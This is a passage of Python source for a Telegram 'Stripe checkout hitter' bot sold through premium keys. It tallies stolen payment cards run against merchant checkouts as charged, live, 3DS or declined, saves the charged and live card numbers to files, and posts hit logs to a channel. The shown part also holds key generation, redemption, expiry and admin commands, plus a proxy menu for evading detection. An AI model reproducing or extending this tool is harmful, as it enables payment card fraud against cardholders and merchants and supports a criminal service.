            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> ⚪ Error\n<b>Response:</b> {h(r['msg'])}")
        
        await asyncio.sleep(4.0)
    
    final = f"""
{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> {bin_in[:8]}xxxx

"""
    for line in result_lines:
        final += f"\n{line}\n{e('─'*20)}\n"
    
    final += f"""
{e('🏦')} <b>Site:</b> {h(ck.mer)} ({h(ck.site_url or 'N/A')})
{e('💰')} <b>Amount:</b> {h(ck.amt)}

{e('📊')} <b>SUMMARY:</b>
{e('🟢')} Charged: <b>{len(charged_cards)}</b>
{e('🔵')} Live CCN (Active): <b>{len(live_cards)}</b>
🟡 3DS: <b>{three_ds}</b>
🔴 Declined: <b>{declined}</b>
{e('⛔')} Captcha: <b>{hcaptcha}</b>
⚪ Error: <b>{errors}</b>

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    
    if charged_cards:
        async with aiofiles.open(f"{DATA_DIR}/charged.txt", "a") as f:
            await f.write("\n".join(charged_cards) + "\n")
    if live_cards:
        async with aiofiles.open(f"{DATA_DIR}/live.txt", "a") as f:
            await f.write("\n".join(live_cards) + "\n")
    
    if len(final) > 4000:
        parts = [final[i:i+3800] for i in range(0, len(final), 3800)]
        for i, part in enumerate(parts):
            if i == 0: await st.edit_text(part, parse_mode=ParseMode.HTML)
            else: 
                await update.message.reply_text(part, parse_mode=ParseMode.HTML)
                await asyncio.sleep(0.5)
    else:
        await st.edit_text(final, parse_mode=ParseMode.HTML)
    
    log_channel = await get_setting("log_channel", "@your_channel")
    if log_channel and (charged_cards or live_cards):
        try:
            await ctx.bot.send_message(
                log_channel,
                f"{e('🔥')} <b>HIT LOG</b>\n"
                f"{e('👤')} <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('📦')} {h(ck.mer)} | {e('💰')} {h(ck.amt)}\n"
                f"{e('🟢')} Charged: {len(charged_cards)} | {e('🔵')} Live CCN: {len(live_cards)}",
                parse_mode=ParseMode.HTML
            )
        except: pass

# ═══════════════ REDEEM & AUTH ═══════════════

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if await is_premium(uid):
        pd = await jload(PREMIUM_FILE, {"users": {}})
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('⛔')} <b>ALREADY PREMIUM</b>\n\n"
            f"{e('👑')} You already have an active premium plan!\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>\n\n"
            f"{e('ℹ️')} Wait for expiry or contact admin.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not ctx.args:
        await update.message.reply_text(
            f"{e('⚠️')} <b>Usage:</b> <code>/redeem &lt;key&gt;</code>\n"
            f"{e('🔑')} <b>Example:</b> <code>/redeem ASIF-aIoL9PmowIlAHfKh4CF5</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    key = ctx.args[0]
    
    if not key.startswith("ASIF-"):
        await update.message.reply_text(
            f"{e('❌')} <b>Invalid key format!</b>\n"
            f"{e('ℹ️')} Keys start with <code>ASIF-</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    kd = await jload(KEYS_FILE, {"keys": {}})
    
    if key not in kd["keys"]:
        await update.message.reply_text(f"{e('❌')} <b>Invalid key!</b> Key not found.", parse_mode=ParseMode.HTML)
        return
    
    kdata = kd["keys"][key]
    
    if kdata.get("used"):
        await update.message.reply_text(
            f"{e('❌')} <b>KEY ALREADY REDEEMED</b>\n\n"
            f"{e('🔑')} This key has already been used.",
            parse_mode=ParseMode.HTML
        )
        return
    
    hours = kdata.get("hours", kdata.get("days", 1) * 24)
    expiry = (datetime.now() + timedelta(hours=hours)).isoformat()
    
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = expiry
    kdata["redeemed_at"] = datetime.now().isoformat()
    await jsave(KEYS_FILE, kd)
    
    dur = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hour(s)"
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    pd["users"][str(uid)] = {
        "name": update.effective_user.full_name,
        "username": update.effective_user.username or "",
        "activated": datetime.now().isoformat(),
        "expiry": expiry,
        "key": key,
        "plan": dur,
    }
    await jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(
        f"{ec('🎉',3)} <b>PREMIUM ACTIVATED!</b> {ec('🎉',3)}\n\n"
        f"{e('👑')} <b>Welcome to ASIF HITTER Premium!</b>\n\n"
        f"{e('🔑')} <b>Key:</b> <code>{key}</code>\n"
        f"{e('⏱️')} <b>Expires:</b> <code>{expiry[:10]}</code>\n"
        f"{e('💎')} <b>Plan:</b> <code>{dur}</code>\n\n"
        f"{e('🚀')} Use <code>/hit</code> to start checking!",
        parse_mode=ParseMode.HTML
    )
    
    log_channel = await get_setting("log_channel", "@your_channel")
    if log_channel:
        try:
            await ctx.bot.send_message(
                log_channel,
                f"{e('🎉')} <b>KEY REDEEMED</b>\n"
                f"{e('👤')} <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('🔑')} <code>{key}</code>\n"
                f"{e('💎')} Plan: {dur}",
                parse_mode=ParseMode.HTML
            )
        except: pass

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_redeem(update, ctx)

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if adm:
        await update.message.reply_text(
            f"{e('⚡')} {e('👑')} <b>ADMIN</b>\n\n"
            f"{e('✅')} Full access — all features unlocked!\n"
            f"{e('💎')} No expiry — permanent access",
            parse_mode=ParseMode.HTML
        )
    elif await is_premium(uid):
        pd = await jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('👑')} <b>PREMIUM ACTIVE</b>\n\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>\n"
            f"{e('✅')} All features unlocked!",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            f"{e('⛔')} <b>FREE USER</b>\n\n"
            f"{e('🔑')} Use <code>/redeem &lt;key&gt;</code> to upgrade",
            parse_mode=ParseMode.HTML
        )

# ═══════════════ ADMIN ═══════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} <b>Usage:</b>\n"
            f"<code>/genkey 10 24 1</code> — 10 keys, 24 hours each\n"
            f"<code>/genkey 5 7 0</code> — 5 keys, 7 days each\n\n"
            f"{e('ℹ️')} Keys format: <code>ASIF-aIoL9Pmow...</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        count = int(ctx.args[0])
        duration = int(ctx.args[1])
        mode = int(ctx.args[2]) if len(ctx.args) > 2 else 1
    except:
        await update.message.reply_text(f"{e('❌')} Invalid numbers", parse_mode=ParseMode.HTML)
        return
    
    hours = duration if mode == 1 else duration * 24
    dur_str = f"{duration} hour(s)" if mode == 1 else f"{duration} day(s)"
    
    kd = await jload(KEYS_FILE, {"keys": {}})
    new_keys = []
    
    for _ in range(count):
        k = generate_secure_key()
        # FIX: Ensure unique across both database AND current batch
        while k in kd["keys"] or k in new_keys:
            k = generate_secure_key()
        
        kd["keys"][k] = {
            "hours": hours,
            "days": duration if mode == 0 else 0,
            "used": False,
            "used_by": None,
            "created": datetime.now().isoformat(),
        }
        new_keys.append(k)
    
    await jsave(KEYS_FILE, kd)
    
    txt = f"{e('🎁')} <b>KEYS GENERATED!</b>\n\n"
    txt += f"{e('📦')} <b>Count:</b> {count}\n"
    txt += f"{e('⏱️')} <b>Duration:</b> {dur_str}\n"
    txt += f"{e('🛡')} <b>Single-use:</b> Yes\n\n"
    txt += f"{e('🔑')} <b>Keys:</b>\n"
    txt += "\n".join([f"<code>{k}</code>" for k in new_keys])
    
    if len(new_keys) > 20:
        buf = StringIO("\n".join(new_keys))
        buf.name = "keys.txt"
        await update.message.reply_document(
            InputFile(buf, filename="ASIF_keys.txt"),
            caption=f"{count} keys generated ({dur_str})"
        )
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    users = pd.get("users", {})
    
    if not users:
        await update.message.reply_text(f"{e('❌')} No premium users", parse_mode=ParseMode.HTML)
        return
    
    txt = f"{e('👑')} <b>PREMIUM USERS</b> ({len(users)})\n\n"
    for uid, u in users.items():
        try:
            exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
            active = e('🟢') if datetime.now() < exp else e('🔴')
            txt += f"{active} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n"
            txt += f"   {e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            txt += f"   {e('💎')} Plan: <code>{u.get('plan','?')}</code>\n"
            txt += f"   {e('🔑')} Key: <code>{u.get('key','?')}</code>\n\n"
        except: pass
    
    if len(txt) > 4000:
        parts = [txt[i:i+3800] for i in range(0, len(txt), 3800)]
        for i, part in enumerate(parts):
            header = f"{e('📄️')} <b>Page {i+1}/{len(parts)}</b>\n\n" if i > 0 else ""
            await update.message.reply_text(header + part, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/rmsub &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    uid = ctx.args[0]
    pd = await jload(PREMIUM_FILE, {"users": {}})
    
    if uid not in pd.get("users", {}):
        await update.message.reply_text(f"{e('❌')} User not found", parse_mode=ParseMode.HTML)
        return
    
    del pd["users"][uid]
    await jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(f"{e('✅')} Premium removed for user <code>{uid}</code>", parse_mode=ParseMode.HTML)
    try:
        await ctx.bot.send_message(int(uid), f"{e('⛔')} Your premium has been revoked by admin.", parse_mode=ParseMode.HTML)
    except: pass

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    msg = update.message.text.replace("/broadcast", "").strip()
    if not msg:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    sent = 0
    for uid in pd.get("users", {}):
        try:
            await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1
            await asyncio.sleep(0.3)
        except: pass
    
    await update.message.reply_text(f"{e('✅')} Sent to <b>{sent}</b> users", parse_mode=ParseMode.HTML)

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if ctx.args:
        await update_setting("log_channel", ctx.args[0])
        await update.message.reply_text(f"{e('✅')} Log channel set to: {h(ctx.args[0])}", parse_mode=ParseMode.HTML)
    else:
        cur = await get_setting("log_channel", "@your_channel")
        await update.message.reply_text(f"{e('ℹ️')} Current: {h(cur)}\nUsage: <code>/sethits @channel</code>", parse_mode=ParseMode.HTML)

# ═══════════════ CALLBACKS ═══════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data
    
    if d == "gate_help":
        await q.message.reply_text(f"{e('🌐')} <b>Gateway Check</b>\n\n{e('ℹ️')} <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "hit_help":
        await q.message.reply_text(f"{e('💳')} <b>Hit Checkout</b>\n\n{e('👑')} Premium!\n{e('ℹ️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "redeem_help":
        await q.message.reply_text(f"{e('🔑')} <b>Redeem Key</b>\n\n{e('ℹ️')} <code>/redeem &lt;key&gt;</code>\nKeys: <code>ASIF-aIoL9Pm...</code>", parse_mode=ParseMode.HTML)
    elif d == "status":
        await cmd_status(update, ctx)
    elif d == "proxy_menu":
        await q.message.reply_text(f"{e('🔐')} <b>PROXY MANAGER</b>\n\n📌 /addproxy\n🔍 /proxy\n🗑 /rmproxy", parse_mode=ParseMode.HTML)
    elif d == "admin" and is_admin(uid):
        kb = [
            [InlineKeyboardButton("🔑 Gen Keys", callback_data="genkey_menu")],
            [InlineKeyboardButton("👥 Premium Users", callback_data="prem_list")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="bcast_help")],
        ]
        await q.message.reply_text(
            f"{e('⚡')} <b>ADMIN PANEL</b>\n\n"
            f"🔑 /genkey 10 24 1\n"
            f"👥 /premium\n"
            f"🗑 /rmsub &lt;id&gt;\n"
            f"📢 /broadcast &lt;msg&gt;\n"
            f"📡 /sethits @channel",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb)
        )

# ═══════════════ AUTO EXPIRE ═══════════════

async def expire_checker(ctx: ContextTypes.DEFAULT_TYPE):
    pd = await jload(PREMIUM_FILE, {"users": {}})
    expired = []
    for uid, u in pd.get("users", {}).items():
        try:
            if datetime.now() > datetime.fromisoformat(u.get("expiry","2000-01-01")):
                expired.append(uid)
        except: pass
    
    for uid in expired:
        del pd["users"][uid]
        try:
            await ctx.bot.send_message(
                int(uid),
                f"{ec('⛔',3)} <b>PREMIUM EXPIRED</b> {ec('⛔',3)}\n\n"
                f"{e('⏱️')} Your premium access has ended.\n"
                f"{e('🔑')} Use /redeem with a new key.\n"
                f"{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
                parse_mode=ParseMode.HTML
            )
        except: pass
    
    if expired:
        await jsave(PREMIUM_FILE, pd)

# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════

async def post_init(app: Application):
    await load_settings()
    print(f"✅ Settings loaded. Log: {await get_setting('log_channel', 'N/A')}")

def main():
    print("🚀 Asif Hitter Bot vFINAL starting...")
    os.makedirs(DATA_DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("auth", cmd_auth))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    if app.job_queue:
        app.job_queue.run_repeating(expire_checker, interval=1800, first=30)
    
    print("✅ Bot running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
